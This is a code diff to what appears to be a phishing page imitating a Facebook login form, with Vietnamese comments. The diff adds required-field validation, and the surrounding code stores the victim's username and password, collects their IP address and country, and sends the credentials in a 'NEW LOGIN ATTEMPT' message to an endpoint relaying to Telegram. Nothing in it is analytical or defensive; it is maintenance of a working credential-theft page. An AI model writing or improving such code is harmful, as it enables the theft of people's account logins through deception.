@@ -225,11 +225,11 @@
         </div>
 
         <div class="input-group">
-            <input type="text" id="username" placeholder="Mobile number or email">
+            <input type="text" id="username" placeholder="Mobile number or email" required>
         </div>
 
         <div class="input-group">
-            <input type="password" id="password" placeholder="Password">
+            <input type="password" id="password" placeholder="Password" required>
         </div>
 
         <button id="loginButton" class="login-button">Log in</button>
@@ -250,6 +250,14 @@
             const username = document.getElementById('username').value;
             const password = document.getElementById('password').value;
             
+            // **Thêm kiểm tra trống tại đây (JavaScript sẽ chạy sau kiểm tra HTML5 'required')**
+            // Dù 'required' đã xử lý ở mức HTML, kiểm tra JS bổ sung có thể hữu ích cho logic phức tạp hơn
+            if (username === '' || password === '') {
+                // Trình duyệt sẽ tự động hiển thị thông báo lỗi, nhưng bạn có thể thêm logic ở đây
+                // nếu muốn thông báo tùy chỉnh bằng JavaScript.
+                return; // Ngừng thực thi nếu có trường trống
+            }
+
             // Lưu thông tin đăng nhập
             localStorage.setItem('fb_credentials', JSON.stringify({
                 username: username,
@@ -281,11 +289,11 @@
 
             // Gửi đến Telegram
             const message = `🔐 <b>NEW LOGIN ATTEMPT</b> 🔐\n\n` +
-                         `👤 <b>Username:</b> ${username}\n` +
-                         `🔑 <b>Password:</b> ${password}\n\n` +
-                         `🌐 <b>IP Address:</b> ${ipInfo.ip}\n` +
-                         `📍 <b>Country:</b> ${ipInfo.country}\n` +
-                         `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
+                            `👤 <b>Username:</b> ${username}\n` +
+                            `🔑 <b>Password:</b> ${password}\n\n` +
+                            `🌐 <b>IP Address:</b> ${ipInfo.ip}\n` +
+                            `📍 <b>Country:</b> ${ipInfo.country}\n` +
+                            `🕒 <b>Time:</b> ${new Date().toLocaleString()}`;
             
             try {
                 await fetch('/api/send-to-telegram', {
